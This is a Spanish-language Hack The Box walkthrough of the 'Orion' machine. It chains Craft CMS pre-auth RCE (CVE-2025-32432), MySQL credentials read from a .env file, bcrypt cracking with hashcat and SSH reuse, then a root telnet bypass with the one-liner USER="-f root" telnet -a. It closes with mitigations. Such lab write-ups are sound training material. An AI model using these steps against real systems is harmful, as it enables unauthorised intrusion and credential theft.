# Orion — HTB

**Plataforma:** Hack The Box  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / Craft CMS / RCE / Telnet

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn -n 10.129.104.22
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP

- Al acceder directamente a la IP, la aplicación nos redirige a:

```text
http://orion.htb/
```

- Añadimos el dominio a nuestra resolución local:

```bash
sudo nano /etc/hosts
```

- Añadimos:

```text
10.129.104.22 orion.htb
```

- Ahora podemos acceder correctamente mediante:

```text
http://orion.htb/
```

## 2. Enumeración

### Enumeración web

- Realizamos fuzzing para descubrir rutas:

```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos:

```text
/admin
/assets
/index.html
/index.php
/logout
```

- Accedemos al panel:

```text
http://orion.htb/admin/login
```

- Identificamos que la aplicación utiliza **Craft CMS 5.6.16**.

### Búsqueda de vulnerabilidades

- Probamos las credenciales por defecto, pero no funcionan.

- Buscamos vulnerabilidades asociadas a **Craft CMS 5.6.16** y encontramos:

```text
CVE-2025-32432
```

- Esta vulnerabilidad permite realizar **Remote Code Execution (RCE) pre-auth**.

## 3. Explotación

### Craft CMS — CVE-2025-32432

- Utilizamos el exploit de **CVE-2025-32432** para conseguir ejecución remota de comandos sin autenticarnos.

- Conseguimos acceso mediante Meterpreter.

- Abrimos una shell:

```text
shell
```

- Nos desplazamos al directorio de la aplicación:

```bash
cd /var/www/html/craft
```

- Enumeramos los archivos:

```bash
ls -la
```

- Encontramos el archivo `.env`.

### Credenciales de la base de datos

- Revisamos el archivo:

```bash
cat .env
```

- Encontramos:

```text
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

- Utilizamos estas credenciales para conectarnos a MySQL:

```bash
mysql -u root -p orion
```

- Introducimos:

```text
SuperSecureCraft123Pass!
```

### Enumeración de MySQL

- Enumeramos las bases de datos y tablas.

- Encontramos la tabla `users` y consultamos su contenido.

- Encontramos el usuario:

```text
admin
```

- También encontramos:

```text
adam@orion.htb
```

- Y el hash de la contraseña:

```text
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

- El formato `$2y$` corresponde a **bcrypt**.

### Crack del hash

- Guardamos el hash:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
```

- Utilizamos Hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

- Conseguimos recuperar la contraseña del usuario `adam`.

### Acceso mediante SSH

- Probamos las credenciales obtenidas contra SSH:

```bash
ssh adam@10.129.104.22
```

- Conseguimos acceder como `adam`.

- Nos desplazamos al directorio personal y obtenemos la User Flag.

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos si `adam` puede ejecutar comandos mediante `sudo`:

```bash
sudo -l
```

- No encontramos ningún comando útil para escalar privilegios.

### Enumeración de SUID

- Buscamos binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- No encontramos ningún binario SUID interesante.

### Enumeración de servicios

- Continuamos investigando los servicios que están escuchando en la máquina:

```bash
netstat -tulnp
```

- Encontramos un servicio **Telnet** escuchando en el puerto `23`.

- Comprobamos la versión:

```bash
telnet --version
```

- La versión es vulnerable a:

```text
CVE-2026-24061
```

### Explotación de Telnet

- Aprovechamos la vulnerabilidad pasando:

```bash
USER="-f root" telnet -a 127.0.0.1
```

- La vulnerabilidad permite realizar un bypass de autenticación y obtener una sesión como `root`.

- Comprobamos nuestros privilegios:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Finalmente obtenemos la Root Flag:

```bash
cat /root/root.txt
```

## 5. Reporte

- La máquina **Orion** comienza con la enumeración de los servicios SSH y HTTP.
- La aplicación web redirige al dominio `orion.htb`, que añadimos a `/etc/hosts`.
- Mediante fuzzing encontramos el panel `/admin/login` y descubrimos que utiliza **Craft CMS 5.6.16**.
- Esta versión es vulnerable a **CVE-2025-32432**, una vulnerabilidad de RCE pre-auth.
- Explotamos la vulnerabilidad y obtenemos acceso al servidor.
- En el archivo `.env` encontramos credenciales de MySQL.
- Accedemos a la base de datos `orion` y encontramos el hash bcrypt del usuario `adam`.
- Crackeamos el hash con Hashcat y obtenemos sus credenciales.
- Utilizamos dichas credenciales para acceder mediante SSH como `adam` y obtenemos la User Flag.
- Para escalar privilegios, comprobamos `sudo` y los SUID, pero no encontramos ningún vector útil.
- Continuamos enumerando servicios y descubrimos Telnet en el puerto `23`.
- La versión utilizada es vulnerable a **CVE-2026-24061**, que permite un bypass de autenticación mediante `USER="-f root"`.
- Explotamos la vulnerabilidad contra el servicio Telnet local y obtenemos una shell como `root`.
- Finalmente obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP
 ↓
orion.htb
 ↓
Craft CMS 5.6.16
 ↓
CVE-2025-32432
 ↓
RCE
 ↓
.env
 ↓
Credenciales MySQL
 ↓
Tabla users
 ↓
Hash bcrypt
 ↓
Hashcat
 ↓
Credenciales de Adam
 ↓
SSH
 ↓
Enumeración local
 ↓
Telnet :23
 ↓
CVE-2026-24061
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| Craft CMS 5.6.16 — CVE-2025-32432 | Crítica | RCE pre-auth |
| Credenciales de base de datos en `.env` | Alta | Acceso a información sensible |
| Hash de contraseña accesible en MySQL | Alta | Permite recuperar credenciales |
| Reutilización de credenciales para SSH | Alta | Acceso al sistema como `adam` |
| Telnet — CVE-2026-24061 | Crítica | Bypass de autenticación y acceso como root |

### Mitigaciones

- Actualizar Craft CMS a una versión corregida.
- Proteger los archivos `.env` para impedir su lectura por usuarios no autorizados.
- No almacenar credenciales sensibles directamente en archivos accesibles por el servidor web.
- Utilizar contraseñas únicas y robustas para cada servicio.
- Deshabilitar Telnet cuando no sea necesario y utilizar SSH.
- Actualizar GNU Inetutils a una versión corregida frente a CVE-2026-24061.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Siempre hay que añadir el dominio identificado por una aplicación a `/etc/hosts` cuando no existe una resolución DNS accesible desde nuestro entorno.
- `ffuf` permite descubrir rutas que no aparecen directamente en la aplicación.
- Identificar la versión exacta de un CMS permite relacionarla con vulnerabilidades conocidas.
- Los archivos `.env` pueden contener credenciales críticas de la aplicación y de la base de datos.
- Los hashes `$2y$` corresponden a bcrypt y pueden atacarse mediante cracking offline.
- Una contraseña reutilizada puede permitir pasar de una aplicación web a SSH.
- Cuando `sudo` y SUID no ofrecen vectores útiles, hay que continuar enumerando servicios locales.
- Los servicios que escuchan únicamente en `127.0.0.1` también pueden ser relevantes para una escalada.
- CVE-2026-24061 permite un bypass de autenticación en versiones vulnerables de `telnetd`.
